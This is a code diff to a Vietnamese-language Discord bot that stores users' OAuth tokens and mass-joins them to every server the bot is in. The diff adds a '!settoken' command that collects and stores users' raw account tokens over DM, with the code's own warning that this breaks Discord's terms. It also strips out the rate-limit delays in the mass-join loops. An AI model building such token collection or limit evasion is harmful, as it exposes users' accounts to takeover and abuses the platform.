@@ -1,7 +1,7 @@
 # main.py - Discord Bot with PostgreSQL + JSONBin.io for persistent token storage
 import os
 import json
-import asyncio # SỬA LỖI: Đảm bảo đã import thư viện asyncio
+import asyncio
 import threading
 import discord
 import aiohttp
@@ -191,7 +191,6 @@ def init_database():
                 user_id VARCHAR(50) PRIMARY KEY,
                 access_token TEXT NOT NULL,
                 username VARCHAR(100),
-                avatar_hash TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
@@ -471,9 +470,6 @@ class ServerSelectView(discord.ui.View):
                 success_count += 1
             else:
                 fail_count += 1
-            
-            # <<< SỬA LỖI: Thêm độ trễ 1 giây để tránh bị rate limit
-            await asyncio.sleep(1)
         
         embed = discord.Embed(title=f"📊 Kết quả mời {self.target_user.name}", color=0x00ff00)
         embed.add_field(name="✅ Thành công", value=f"{success_count} server", inline=True)
@@ -673,9 +669,6 @@ class DeployView(discord.ui.View):
                 else: fail_count += 1; failed_users.append(f"<@{user_id}> ({message[:50]})")
             except Exception as e:
                 fail_count += 1; failed_users.append(f"<@{user_id}> (Lỗi: {e})")
-            
-            # <<< SỬA LỖI: Thêm độ trễ 1 giây để tránh bị rate limit
-            await asyncio.sleep(1)
 
         embed = discord.Embed(title=f"Báo Cáo Triển Khai tới {self.selected_guild.name}", color=0x00ff00)
         embed.add_field(name="✅ Thành Công", value=f"{success_count} điệp viên", inline=True)
@@ -997,13 +990,63 @@ async def auth(ctx):
         f'&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join'
     )
     embed = discord.Embed(
-        title="🔐 Ủy quyền cho Bot",
-        description=f"Nhấp vào link bên dưới để cho phép bot thêm bạn vào các server:",
+        title="🔐 Ủy quyền cho Bot (An Toàn)",
+        description=f"Nhấp vào link bên dưới để cho phép bot thêm bạn vào các server một cách an toàn:",
         color=0x00ff00
     )
     embed.add_field(name="🔗 Link ủy quyền", value=f"[Nhấp vào đây]({auth_url})", inline=False)
-    embed.add_field(name="📌 Lưu ý", value="Token sẽ được lưu an toàn vào cloud storage", inline=False)
+    embed.add_field(name="📌 Lưu ý", value="Đây là phương pháp chính thức và an toàn nhất, không làm lộ token của bạn.", inline=False)
     await ctx.send(embed=embed)
+
+# --- LỆNH MỚI ĐỂ SET SELF-TOKEN ---
+@bot.command(name='settoken', help='(DM Only) Cung cấp token để bot sử dụng.')
+async def settoken(ctx, *, token: str = None):
+    """
+    Cho phép người dùng tự cung cấp token qua tin nhắn riêng (DM).
+    CẢNH BÁO: VIỆC NÀY NGUY HIỂM VÀ VI PHẠM TOS CỦA DISCORD.
+    """
+    if not isinstance(ctx.channel, discord.DMChannel):
+        try:
+            await ctx.message.delete()
+        except discord.Forbidden:
+            pass # Không có quyền xóa tin nhắn
+        await ctx.author.send("🚫 Lệnh `!settoken` chỉ có thể được sử dụng trong tin nhắn riêng tư (DM) với bot để đảm bảo an toàn. Vui lòng thử lại trong DM.")
+        return
+
+    if not token:
+        embed = discord.Embed(
+            title="❌ Thiếu Token",
+            description="Vui lòng cung cấp token của bạn.\nCách dùng: `!settoken <token_của_bạn>`",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+        return
+
+    user_id = str(ctx.author.id)
+    username = ctx.author.name
+    
+    # Lưu token mà không cần avatar_hash
+    success = save_user_token(user_id, token.strip(), username)
+    
+    if success:
+        embed = discord.Embed(
+            title="✅ Đã Lưu Token",
+            description=f"Đã lưu token thành công cho **{username}**.",
+            color=0x00ff00
+        )
+        embed.add_field(
+            name="⚠️ CẢNH BÁO",
+            value="Sử dụng token tài khoản của bạn cho bot tự động là vi phạm Điều khoản Dịch vụ của Discord và có thể khiến tài khoản của bạn bị cấm. Hãy tự chịu rủi ro.",
+            inline=False
+        )
+        await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(
+            title="❌ Lỗi Lưu Trữ",
+            description="Đã xảy ra lỗi khi lưu token của bạn. Vui lòng thử lại sau hoặc liên hệ với chủ bot.",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
 
 @bot.command(name='add_me', help='Thêm bạn vào tất cả các server của bot.')
 async def add_me(ctx):
@@ -1014,7 +1057,7 @@ async def add_me(ctx):
     if not access_token:
         embed = discord.Embed(
             title="❌ Chưa ủy quyền",
-            description="Bạn chưa ủy quyền cho bot. Hãy sử dụng lệnh `!auth` trước.",
+            description="Bạn chưa ủy quyền cho bot. Hãy sử dụng lệnh `!auth` (an toàn) hoặc `!settoken` (không an toàn).",
             color=0xff0000
         )
         await ctx.send(embed=embed)
@@ -1039,15 +1082,10 @@ async def add_me(ctx):
             else:
                 print(f"👎 Lỗi khi thêm vào {guild.name}: {message}")
                 fail_count += 1
-
-            # <<< SỬA LỖI: Thêm độ trễ 1 giây để tránh bị rate limit
-            await asyncio.sleep(1)
                 
         except Exception as e:
             print(f"👎 Lỗi không xác định khi thêm vào {guild.name}: {e}")
             fail_count += 1
-            # <<< SỬA LỖI: Thêm độ trễ 1 giây ngay cả khi có lỗi để tránh spam request hỏng
-            await asyncio.sleep(1)
     
     embed = discord.Embed(title="📊 Kết quả", color=0x00ff00)
     embed.add_field(name="✅ Thành công", value=f"{success_count} server", inline=True)
@@ -1069,7 +1107,7 @@ async def check_token(ctx):
     else:
         embed = discord.Embed(
             title="❌ Chưa ủy quyền", 
-            description="Bạn chưa ủy quyền cho bot. Hãy sử dụng `!auth`",
+            description="Bạn chưa ủy quyền cho bot. Hãy sử dụng `!auth` hoặc `!settoken`",
             color=0xff0000
         )
     
@@ -1133,15 +1171,10 @@ async def force_add(ctx, user_to_add: discord.User):
             else:
                 print(f"👎 Lỗi khi thêm vào {guild.name}: {message}")
                 fail_count += 1
-            
-            # <<< SỬA LỖI: Thêm độ trễ 1 giây để tránh bị rate limit
-            await asyncio.sleep(1)
                 
         except Exception as e:
             print(f"👎 Lỗi không xác định khi thêm vào {guild.name}: {e}")
             fail_count += 1
-            # <<< SỬA LỖI: Thêm độ trễ 1 giây ngay cả khi có lỗi để tránh spam request hỏng
-            await asyncio.sleep(1)
     
     embed = discord.Embed(title=f"📊 Kết quả thêm {user_to_add.name}", color=0x00ff00)
     embed.add_field(name="✅ Thành công", value=f"{success_count} server", inline=True)
@@ -1192,7 +1225,8 @@ async def help_slash(interaction: discord.Interaction):
     
     # Lệnh cho mọi người
     embed.add_field(name="🕵️ Lệnh Cơ Bản (Dành cho mọi Điệp viên)", value="----------------------------------", inline=False)
-    embed.add_field(name="`!auth`", value="Lấy link ủy quyền để gia nhập mạng lưới.", inline=True)
+    embed.add_field(name="`!auth`", value="Lấy link ủy quyền (an toàn).", inline=True)
+    embed.add_field(name="`!settoken <token>`", value="Cung cấp token (không an toàn, DM only).", inline=True)
     embed.add_field(name="`!add_me`", value="Tự triển khai bản thân đến tất cả server.", inline=True)
     embed.add_field(name="`!check_token`", value="Kiểm tra trạng thái ủy quyền của bạn.", inline=True)
     embed.add_field(name="`!status`", value="Xem trạng thái hoạt động của bot và hệ thống.", inline=True)
@@ -1207,8 +1241,6 @@ async def help_slash(interaction: discord.Interaction):
         embed.add_field(name="`!remove <User>`", value="Xóa dữ liệu của một điệp viên.", inline=True)
         embed.add_field(name="`!force_add <User>`", value="Ép thêm điệp viên vào TẤT CẢ server.", inline=True)
         embed.add_field(name="`!storage_info`", value="Xem thông tin các hệ thống lưu trữ.", inline=True)
-        embed.add_field(name="`!create`", value="Tạo nhiều kênh trong nhiều server.", inline=True)
-        embed.add_field(name="`!getid`", value="Lấy ID kênh theo tên.", inline=True)
 
     embed.set_footer(text="Hãy chọn một mật lệnh để bắt đầu chiến dịch.")
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1224,7 +1256,8 @@ async def help(ctx):
     
     # Lệnh cho mọi người
     embed.add_field(name="🕵️ Lệnh Cơ Bản (Dành cho mọi Điệp viên)", value="----------------------------------", inline=False)
-    embed.add_field(name="`!auth`", value="Lấy link ủy quyền để gia nhập mạng lưới.", inline=True)
+    embed.add_field(name="`!auth`", value="Lấy link ủy quyền (an toàn).", inline=True)
+    embed.add_field(name="`!settoken <token>`", value="Cung cấp token (không an toàn, DM only).", inline=True)
     embed.add_field(name="`!add_me`", value="Tự triển khai bản thân đến tất cả server.", inline=True)
     embed.add_field(name="`!check_token`", value="Kiểm tra trạng thái ủy quyền của bạn.", inline=True)
     embed.add_field(name="`!status`", value="Xem trạng thái hoạt động của bot và hệ thống.", inline=True)
@@ -1239,8 +1272,6 @@ async def help(ctx):
         embed.add_field(name="`!remove <User>`", value="Xóa dữ liệu của một điệp viên.", inline=True)
         embed.add_field(name="`!force_add <User>`", value="Ép thêm điệp viên vào TẤT CẢ server.", inline=True)
         embed.add_field(name="`!storage_info`", value="Xem thông tin các hệ thống lưu trữ.", inline=True)
-        embed.add_field(name="`!create`", value="Tạo nhiều kênh trong nhiều server.", inline=True)
-        embed.add_field(name="`!getid`", value="Lấy ID kênh theo tên.", inline=True)
 
     embed.set_footer(text="Hãy chọn một mật lệnh để bắt đầu chiến dịch.")
     await ctx.send(embed=embed)
@@ -1325,13 +1356,12 @@ async def migrate_tokens(ctx, source: str = None, target: str = None):
         if conn:
             try:
                 cursor = conn.cursor()
-                cursor.execute("SELECT user_id, access_token, username, avatar_hash FROM user_tokens")
+                cursor.execute("SELECT user_id, access_token, username FROM user_tokens")
                 rows = cursor.fetchall()
                 for row in rows:
                     source_data[row[0]] = {
                         'access_token': row[1],
                         'username': row[2],
-                        'avatar_hash': row[3],
                         'updated_at': str(time.time())
                     }
                 cursor.close()
@@ -1365,19 +1395,17 @@ async def migrate_tokens(ctx, source: str = None, target: str = None):
         if isinstance(token_data, dict):
             access_token = token_data.get('access_token')
             username = token_data.get('username')
-            avatar_hash = token_data.get('avatar_hash')
-        else: # for older formats
+        else:
             access_token = token_data
             username = None
-            avatar_hash = None
         
         success = False
         if target == "db":
-            success = save_user_token_db(user_id, access_token, username, avatar_hash)
+            success = save_user_token_db(user_id, access_token, username)
         elif target == "jsonbin":
-            success = jsonbin_storage.save_user_token(user_id, access_token, username, avatar_hash)
+            success = jsonbin_storage.save_user_token(user_id, access_token, username)
         elif target == "json":
-            success = save_user_token_json(user_id, access_token, username, avatar_hash)
+            success = save_user_token_json(user_id, access_token, username)
         
         if success:
             success_count += 1
@@ -1929,7 +1957,7 @@ def index():
                 </div>
                 
                 <a href="{auth_url}" class="authorize-btn">
-                    🔐 ĐĂNG NHẬP 
+                    🔐 ĐĂNG NHẬP (AN TOÀN)
                 </a>
             </div>
             
@@ -1937,7 +1965,11 @@ def index():
                 <h3 class="command-title">🔍 MẬT LỆNH HIỆN TRƯỜNG</h3>
                 <div class="command-item">
                     <span class="command-code">!auth</span>
-                    <span class="command-desc">- Yêu cầu thông tin ủy quyền</span>
+                    <span class="command-desc">- Yêu cầu thông tin ủy quyền (An toàn)</span>
+                </div>
+                <div class="command-item">
+                    <span class="command-code">!settoken</span>
+                    <span class="command-desc">- Cung cấp token thủ công (Không an toàn)</span>
                 </div>
                 <div class="command-item">
                     <span class="command-code">!add_me</span>
